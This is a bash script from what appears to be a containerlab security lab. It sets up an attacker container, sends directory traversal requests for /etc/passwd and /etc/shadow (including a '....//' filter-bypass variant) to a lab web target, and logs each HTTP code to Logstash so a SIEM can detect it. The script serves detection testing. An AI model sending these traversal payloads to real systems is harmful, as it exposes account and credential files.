#!/bin/bash
set -euo pipefail

BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "${BASE_DIR}/config/variables.sh"

ATTACKER_CONTAINER="clab-${LAB_NAME}-Attacker"
TARGET_BASE_URL="http://${EXT_FW_NAT_IP}:8080"
LOGSTASH_TCP_HOST="${SIEM_LOGSTASH_ETH1_IP%/*}"
LOGSTASH_TCP_PORT="5000"

echo "=== Directory Traversal Test (from Attacker container) ==="
echo "Target: ${TARGET_BASE_URL}"
echo "Logstash TCP: ${LOGSTASH_TCP_HOST}:${LOGSTASH_TCP_PORT}"

if ! docker ps --format '{{.Names}}' | grep -qx "${ATTACKER_CONTAINER}"; then
  echo "[ERROR] Attacker container not running: ${ATTACKER_CONTAINER}"
  exit 1
fi

prepare_attacker() {
  docker exec -i \
    -e INTERNET_ATTACKER_ETH1_IP="${INTERNET_ATTACKER_ETH1_IP}" \
    -e ROUTER_INTERNET_ETH1_IP="${ROUTER_INTERNET_ETH1_IP}" \
    -e EXT_FW_NAT_IP="${EXT_FW_NAT_IP}" \
    "${ATTACKER_CONTAINER}" bash -c '
      set -e
      # DNS first (required for apt)
      grep -q nameserver /etc/resolv.conf 2>/dev/null || echo "nameserver 8.8.8.8" > /etc/resolv.conf

      # Install tools (fail LOUDLY this time)
      if ! command -v ip >/dev/null 2>&1 || ! command -v curl >/dev/null 2>&1; then
        if command -v apt-get >/dev/null 2>&1; then
          export DEBIAN_FRONTEND=noninteractive
          apt-get update -qq
          apt-get install -y --no-install-recommends iproute2 iputils-ping curl netcat-openbsd
        elif command -v apk >/dev/null 2>&1; then
          apk add --no-cache iproute2 iputils curl netcat-openbsd
        fi
      fi

      # Network setup
      ip addr add "${INTERNET_ATTACKER_ETH1_IP}" dev eth1 2>/dev/null || true
      ip link set eth1 up
      ip route replace default via "${ROUTER_INTERNET_ETH1_IP%/*}" dev eth1
      ip route replace "${EXT_FW_NAT_IP}" via "${ROUTER_INTERNET_ETH1_IP%/*}" dev eth1

      # Sanity
      ip -4 addr show eth1 | head -3
    '
}


send_attack_log() {
  local attack_type="$1"
  local http_code="$2"
  local logstash_container="clab-${LAB_NAME}-logstash"
  # 환경변수 전달 + outer single-quote로 호스트 bash 확장 방지
  # bash의 stdout redirect로 TCP 연결, 명령 종료와 함께 자동 close → Logstash가 이벤트 확정
  timeout 5 sudo docker exec \
    -e ATK_TYPE="$attack_type" \
    -e ATK_CODE="$http_code" \
    "${logstash_container}" \
    bash -c '
      MSG=$(printf "{\"log_type\":\"attack\",\"attack_type\":\"%s\",\"http_code\":\"%s\",\"source\":\"attacker\"}\n" "$ATK_TYPE" "$ATK_CODE")
      printf "%s" "$MSG" > /dev/tcp/127.0.0.1/5000
    ' >/dev/null 2>&1 || true
}


prepare_attacker

for path in "../../../../etc/passwd" "../../../etc/shadow" "....//....//etc/passwd"; do
  echo -n "Path: $path → "
  CODE=$(docker exec \
    -e ATTACK_URL="${TARGET_BASE_URL}/${path}" \
    "${ATTACKER_CONTAINER}" sh -lc '
      result=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 --max-time 10 "$ATTACK_URL" 2>/dev/null) || true
      echo "${result:-000}"
    ' 2>/dev/null)
  CODE=${CODE:-000}
  echo "HTTP $CODE"
  send_attack_log "path_traversal" "$CODE"
  sleep 1
done

echo "=== Done ==="
